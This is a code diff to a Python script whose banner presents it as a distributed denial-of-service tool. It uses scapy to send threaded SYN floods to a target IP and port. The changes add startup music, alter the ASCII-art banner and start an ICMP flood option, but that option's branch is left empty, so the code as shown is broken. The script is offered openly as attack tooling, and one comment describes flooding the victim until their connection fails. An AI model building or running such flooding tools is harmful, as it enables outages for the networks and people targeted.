@@ -2,10 +2,12 @@
 import os
 import random
 import threading
-
 import scapy.all
 from scapy.layers.inet import IP, TCP
-
+import time
+import subprocess
+subprocess.Popen(["vlc", "--intf", "dummy", "--no-video", "Maniacs of Noise - Firing Up V2.00.mp3"])
+os.system("clear")
 #cool ascii art :3
 print(r"▓█████▄ ▓█████▄  ▒█████    ██████          ██▀███  "+"\n"
       r"▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒         ▓██ ▒ ██▒"+"\n"
@@ -13,8 +15,8 @@ print(r"▓█████▄ ▓█████▄  ▒█████    █�
       r"░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒        ▒██▀▀█▄  "+"\n"
       r"░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒        ░██▓ ▒██▒"+"\n"
       r" ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░        ░ ▒▓ ░▒▓░"+"\n"
-      r" ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░          ░▒ ░ ▒░"+"\n"
-      r" ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░            ░░   ░ "+"\n"
+      r" ░S▒YN▒TH░E▒Si▒ZE ░ ▒ ▒░ ░ ░▒  ░ ░          ░▒ ░ ▒░"+"\n"
+      r" ░ ░  ░  ░ ░  ░ ░ ░D░E▒HU░MA░Ni░ZE          ░░   ░ "+"\n"
       r"   ░       ░        ░ ░        ░    version 1.0.0"+"\n"
       r"a dead simple distributed denial-of-service tool"+"\n"
       r"by WIL_FU_"+"\n"
@@ -96,16 +98,6 @@ def syn_flood():
             thread.start()
         for thread in threads:
             thread.join()
-        #for x in range(0, threadCount):
-        #    threadVarName = f"thread{str(x)}"
-        #    exec(f"{threadVarName} = {threading.Thread(target=send_syn_packet, args=(ip,random.randint(1,1000),int(packets)))}")
-        #print("[*] SYN FLOOD BEGIN")
-        #for x in range(0, threadCount):
-        #    threadVarName = f"thread{str(x)}"
-        #    exec(f"{threadVarName}.start()")
-        #for x in range(0, threadCount):
-        #    threadVarName = f"thread{str(x)}"
-        #    exec(f"{threadVarName}.join()")
         print("[*] SYN FLOOD END")
     #flooding chosen port of chosen IP with SYN packets until the victim's connection shits itself
     send_syn_packet(ip, int(port), int(packets))
@@ -115,6 +107,7 @@ def attack_type():
     print("----ATTACK MENU----")
     print("|                 |")
     print("| [1]-SYN_FLOOD_  |")
+    print("| [2]-ICMP_FLOOD_  |")
     print("| MORE 2 COME     |")
     print("|                 |")
     print("-------------------")
@@ -151,5 +144,7 @@ def attack_setup(attacktype):
         outputAsListItem("PORT: ", s)
         closeList(s)
         syn_flood()
+    if attackTypes[attacktype - 1] == "ICMP FLOOD":
+
 #program begin
 attack_setup(attack_type())
